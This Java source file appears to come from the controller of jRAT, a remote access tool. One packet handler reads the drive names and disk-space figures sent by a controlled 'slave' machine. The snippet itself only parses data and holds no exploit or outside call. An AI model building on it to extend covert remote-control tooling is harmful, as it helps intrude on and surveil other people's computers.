package jrat.controller.packets.incoming;

import jrat.controller.Drive;
import jrat.controller.Slave;


public class Packet17InitDrives extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int len = slave.readInt();

		slave.setDrives(new Drive[len]);

		for (int i = 0; i < len; i++) {
			Drive drive = new Drive();
			drive.setName(slave.readLine());
			drive.setTotalSpace(slave.readShort());
			drive.setFreeSpace(slave.readShort());
			drive.setUsableSpace(slave.readShort());
			slave.getDrives()[i] = drive;
		}
	}

}
